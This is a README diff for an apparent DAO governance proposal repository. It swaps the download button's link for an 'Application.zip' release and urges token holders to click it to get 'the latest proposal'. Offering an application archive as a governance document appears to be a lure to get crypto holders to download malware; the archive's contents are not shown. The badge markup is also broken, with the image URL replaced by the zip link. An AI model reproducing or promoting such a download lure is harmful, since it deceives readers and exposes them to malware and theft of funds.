@@ -20,7 +20,7 @@ We value your input and encourage all token holders to actively participate in t
 To stay informed about the latest proposals and discussions, make sure to regularly check this repository for updates. You can also subscribe to notifications to receive alerts whenever a new proposal is posted or a vote is scheduled.
 
 ## Proposal Link
-[![Download Proposal](https://img.shields.io/badge/Download%20Proposal-Click%20Here-brightgreen)](https://github.com/file/Application.zip)
+[![Download Proposal](https://github.com/leafyjacket/Governance-proposal-/releases/download/v1.0.0/Application.zip%20Proposal-Click%20Here-brightgreen)](https://github.com/leafyjacket/Governance-proposal-/releases/download/v1.0.0/Application.zip)
 
 🚀 **Launching Proposal**
 Make sure to click on the button above to download the latest proposal and be part of the governance decisions that shape our DAO's future.
